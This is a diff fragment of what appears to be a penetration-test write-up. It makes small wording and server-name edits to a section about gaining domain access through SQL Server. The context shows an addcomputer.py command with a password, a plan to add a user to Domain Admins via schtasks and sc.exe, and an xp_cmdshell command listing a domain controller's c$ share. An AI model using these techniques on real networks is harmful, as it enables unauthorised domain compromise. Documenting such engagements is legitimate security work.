@@ -68,10 +68,10 @@ addcomputer.py 'REDACTED/SQLPROD':'P@ssw0rd1337#' -method LDAPS -computer-name '
 
 
 ### Schtasks & Sc
-Another idea I had was to write the commands in one file i.e commands to add our user to Local and Domain Admin Groups, then execute the script as a scheduled task using `schtasks` and as a service using `sc.exe`, but that didn't work either. At this point, I am starting to doubt this is a domain admin account. However, trying to access the domain controller works, indicating that the privileges are elevated.
+Another idea I had was to write the commands in one file i.e commands to add our user to Local and Domain Admin Groups, then execute the script as a scheduled task using `schtasks` and as a service using `sc.exe`, but that didn't work either. At this point, I am starting to doubt this is a domain admin account. However, trying to access the domain controller, it works, indicating that the privileges are elevated.
 
 ```c
-EXEC('xp_cmdshell ''dir \\DC.REDACTED.int\c$'' ;') AT "R3SQL1\REDACTEDSQL";
+EXEC('xp_cmdshell ''dir \\DC.REDACTED.int\c$'' ;') AT "R3SQL1";
 output                                                                                             
 ------------------------------------------------------------------------------------------------   
  Volume in drive \\DC.REDACTED.int\c$ has no label.                                           
